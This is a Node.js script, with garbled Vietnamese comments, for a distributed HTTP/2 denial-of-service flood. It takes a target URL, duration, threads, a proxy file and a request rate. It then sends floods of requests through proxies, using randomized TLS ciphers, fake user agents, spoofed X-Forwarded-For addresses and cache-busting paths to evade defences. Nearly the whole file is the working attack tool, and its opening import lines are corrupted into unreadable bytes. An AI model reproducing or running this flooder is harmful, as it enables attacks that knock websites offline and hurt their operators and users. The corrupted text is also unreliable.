ðüýàç³æáÿ³®³áöâæúáö»´æáÿ´º¨™ðüýàç³õà³®³áöâæúáö»´õà´º¨™ðüýàç³ûççã¡³®³áöâæúáö»´ûççã¡´º¨™ðüýàç³ûççã³®³áequire('http');
const tls = require('tls');
const net = require('net');
const request = require('request');
const cluster = require('cluster');
const fakeua = require('fake-useragent');
const randstr = require('randomstring');

// Danh sÃ¡ch cipher TLS
const cplist = [
  'GREASE:X25519:x25519',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'
];

// Danh sÃ¡ch tiÃªu Ä‘á» Accept
const accept_header = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];

// Danh sÃ¡ch tiÃªu Ä‘á» Accept-Language
const lang_header = [
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'fr-CH,fr;q=0.9,en;q=0.8,de;q=0.7,*;q=0.5',
  'en-US,en;q=0.5',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'da,en-gb;q=0.8,en;q=0.7',
  'cs;q=0.5'
];

// Danh sÃ¡ch tiÃªu Ä‘á» Accept-Encoding
const encoding_header = [
  'gzip, deflate, br',
  'deflate, gzip;q=1.0, *;q=0.5',
  '*'
];

// Danh sÃ¡ch tiÃªu Ä‘á» Cache-Control
const controle_header = [
  'no-cache',
  'no-store',
  'no-transform',
  'only-if-cached',
  'max-age=0'
];

// Danh sÃ¡ch lá»—i vÃ  mÃ£ lá»—i bá»‹ bá» qua
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

// Bá»™ Ä‘áº¿m yÃªu cáº§u
let successfulRequests = 0;
let failedRequests = 0;

// Bá» qua cÃ¡c lá»—i khÃ´ng mong muá»‘n
process
  .on('uncaughtException', () => {})
  .on('unhandledRejection', () => {})
  .on('warning', () => {})
  .setMaxListeners(0);

// HÃ m hiá»ƒn thá»‹ chá»‰ dáº«n sá»­ dá»¥ng
function showUsage() {
  console.log(`
Usage: node ${process.argv[1]} <target_url> <time> <threads> <proxy_file> <rps>

Parameters:
  target_url  : Target URL (e.g., https://example.com)
  time        : Duration of the attack in seconds (e.g., 60)
  threads     : Number of threads to use (e.g., 4)
  proxy_file  : Path to the proxy list file (e.g., proxies.txt)
  rps         : Requests per second per thread (e.g., 100)

Example:
  node ${process.argv[1]} https://example.com 60 4 proxies.txt 100

Note: Ensure the proxy file exists and contains valid proxies in the format "ip:port".
  `);
  process.exit(1);
}

// Kiá»ƒm tra tham sá»‘ dÃ²ng lá»‡nh
if (process.argv.length !== 7) {
  console.error('[Error] Invalid number of arguments.');
  showUsage();
}

// Kiá»ƒm tra tÃ­nh há»£p lá»‡ cá»§a tham sá»‘
const target = process.argv[2];
const time = parseInt(process.argv[3]);
const thread = parseInt(process.argv[4]);
const proxyFile = process.argv[5];
const rps = parseInt(process.argv[6]);

if (!target.startsWith('http')) {
  console.error('[Error] Target URL must start with http or https.');
  showUsage();
}
if (isNaN(time) || time <= 0) {
  console.error('[Error] Time must be a positive number.');
  showUsage();
}
if (isNaN(thread) || thread <= 0) {
  console.error('[Error] Threads must be a positive number.');
  showUsage();
}
if (!fs.existsSync(proxyFile)) {
  console.error('[Error] Proxy file does not exist.');
  showUsage();
}
if (isNaN(rps) || rps <= 0) {
  console.error('[Error] RPS must be a positive number.');
  showUsage();
}

// HÃ m chá»n ngáº«u nhiÃªn tiÃªu Ä‘á» Accept
function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)];
}

// HÃ m chá»n ngáº«u nhiÃªn tiÃªu Ä‘á» Accept-Language
function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)];
}

// HÃ m chá»n ngáº«u nhiÃªn tiÃªu Ä‘á» Accept-Encoding
function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

// HÃ m chá»n ngáº«u nhiÃªn tiÃªu Ä‘á» Cache-Control
function controling() {
  return controle_header[Math.floor(Math.random() * controle_header.length)];
}

// HÃ m chá»n ngáº«u nhiÃªn cipher TLS
function cipher() {
  return cplist[Math.floor(Math.random() * cplist.length)];
}

// HÃ m táº¡o chuá»—i ngáº«u nhiÃªn (giáº£ máº¡o token hoáº·c tÃªn mÃ¡y chá»§)
function spoof() {
  const charset = '012345';
  return (
    randstr.generate({ length: 1, charset: '12' }) +
    randstr.generate({ length: 1, charset }) +
    randstr.generate({ length: 1, charset }) +
    '.' +
    randstr.generate({ length: 1, charset: '12' }) +
    randstr.generate({ length: 1, charset }) +
    randstr.generate({ length: 1, charset }) +
    '.' +
    randstr.generate({ length: 1, charset: '12' }) +
    randstr.generate({ length: 1, charset }) +
    randstr.generate({ length: 1, charset }) +
    '.' +
    randstr.generate({ length: 1, charset: '12' }) +
    randstr.generate({ length: 1, charset }) +
    randstr.generate({ length: 1, charset })
  );
}

// HÃ m táº¡o byte ngáº«u nhiÃªn
function randomByte() {
  return Math.round(Math.random() * 256);
}

// HÃ m táº¡o Ä‘á»‹a chá»‰ IP ngáº«u nhiÃªn (trÃ¡nh IP riÃªng)
function randomIp() {
  const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
  return isPrivate(ip) ? randomIp() : ip;
}

// HÃ m kiá»ƒm tra IP riÃªng
function isPrivate(ip) {
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

// HÃ m táº¡o path ngáº«u nhiÃªn
function randomPath() {
  return '/' + randstr.generate({ length: 3, charset: 'abcdefghijklmnopqrstuvwxyz' });
}

// HÃ m táº¡o query parameter ngáº«u nhiÃªn Ä‘á»ƒ bypass cache
function randomQuery() {
  return '?cachebust=' + randstr.generate({ length: 6, charset: 'abcdefghijklmnopqrstuvwxyz0123456789' });
}

// Äá»c danh sÃ¡ch proxy
const proxies = fs.readFileSync(proxyFile, 'utf-8').match(/\S+/g);

// HÃ m chá»n proxy ngáº«u nhiÃªn
function proxyr() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

// HÃ m ghi log tÃ³m táº¯t
function logSummary() {
  console.log(`[Summary] Successful: ${successfulRequests}, Failed: ${failedRequests}`);
}

// Cháº¡y á»Ÿ cháº¿ Ä‘á»™ chÃ­nh (master)
if (cluster.isMaster) {
  console.log(`Your Target: ${target} | Threads: ${thread} | RPS: ${rps} by @hyiptotop`);
  for (let i = 0; i < thread; i++) {
    cluster.fork(); // Táº¡o luá»“ng con
  }
  // In tÃ³m táº¯t má»—i 5 giÃ¢y
  setInterval(logSummary, 5000);
  setTimeout(() => {
    logSummary();
    process.exit(-1);
  }, time * 1000); // ThoÃ¡t sau thá»i gian quy Ä‘á»‹nh
} else {
  // HÃ m thá»±c hiá»‡n táº¥n cÃ´ng (cháº¡y trong luá»“ng con)
  function flood() {
    const parsed = url.parse(target); // PhÃ¢n tÃ­ch URL
    const userAgent = fakeua(); // Táº¡o User-Agent giáº£
    const selectedCipher = cipher(); // Chá»n cipher
    const proxy = proxyr().split(':'); // Chá»n proxy
    const jar = request.jar(); // Quáº£n lÃ½ cookie
    const randomIP = randomIp(); // Táº¡o IP giáº£

    // Táº¡o path vÃ  query ngáº«u nhiÃªn
    const pathWithRandom = parsed.path + randomPath() + randomQuery();

    // TiÃªu Ä‘á» HTTP/2
    const headers = {
      ':method': 'GET',
      ':authority': parsed.host,
      ':path': pathWithRandom, // Sá»­ dá»¥ng path ngáº«u nhiÃªn
      ':scheme': 'https',
      'X-Forwarded-For': randomIP,
      'user-agent': userAgent,
      'Origin': target,
      'accept': accept(),
      'accept-encoding': encoding(),
      'accept-language': lang(),
      'referer': target,
      'cache-control': 'no-cache', // Bypass cache
      'pragma': 'no-cache' // Bypass cache
    };

    // Ghi log yÃªu cáº§u gá»­i Ä‘i
    console.log(`[Request] Sending to ${target}${pathWithRandom} via proxy ${proxy[0]}:${proxy[1]} | IP: ${randomIP} | UA: ${userAgent}`);

    // Thiáº¿t láº­p agent HTTP
    const agent = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 50000,
      maxSockets: Infinity,
      maxTotalSockets: Infinity
    });

    // YÃªu cáº§u HTTP qua proxy
    const req = http.request({
      host: proxy[0],
      port: proxy[1],
      agent: agent,
      globalAgent: agent,
      headers: {
        'Host': parsed.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive'
      },
      method: 'CONNECT',
      path: parsed.host + ':443'
    }, () => {
      req.setSocketKeepAlive(true);
    });

    req.on('error', (err) => {
      console.log(`[Error] HTTP Request failed: ${err.message}`);
      failedRequests++;
    });

    req.on('connect', (res, socket) => {
      // Thiáº¿t láº­p káº¿t ná»‘i TLS
      const tlsConnection = tls.connect({
        host: parsed.host,
        port: 443,
        servername: parsed.host,
        followAllRedirects: true,
        maxRedirects: 5,
        secureProtocol: ['TLSv1_3_method', 'TLSv1_2_method', 'TLSv1_1_method'],
        echdCurve: 'GREASE:X25519:x25519',
        secure: true,
        honorCipherOrder: true,
        rejectUnauthorized: false,
        sessionTimeout: 5000,
        ALPNProtocols: ['h2', 'http1.1'],
        socket: socket
      }, () => {
        // Thiáº¿t láº­p phiÃªn HTTP/2
        const client = http2.connect(parsed.href, {
          createConnection: () => tlsConnection,
          settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          }
        }, (session) => {
          // Gá»­i yÃªu cáº§u theo rps
          for (let i = 0; i < rps; i++) {
            // Cáº­p nháº­t path ngáº«u nhiÃªn cho má»—i stream
            headers[':path'] = parsed.path + randomPath() + randomQuery();
            const stream = client.request(headers);
            stream.setEncoding('utf8');

            stream.on('response', (responseHeaders) => {
              console.log(`[Success] Request to ${target}${headers[':path']} succeeded | Status: ${responseHeaders[':status']}`);
              successfulRequests++;
              stream.close();
            });

            stream.on('data', () => {});

            stream.on('error', (err) => {
              console.log(`[Error] HTTP/2 Stream failed: ${err.message}`);
              failedRequests++;
            });

            stream.end();
          }
        });

        client.on('error', (err) => {
          console.log(`[Error] HTTP/2 Client failed: ${err.message}`);
          failedRequests++;
        });
      });

      tlsConnection.on('error', (err) => {
        console.log(`[Error] TLS Connection failed: ${err.message}`);
        failedRequests++;
      });
    });

    req.end();
  }

  // Cháº¡y liÃªn tá»¥c
  setInterval(flood);
}zAlO
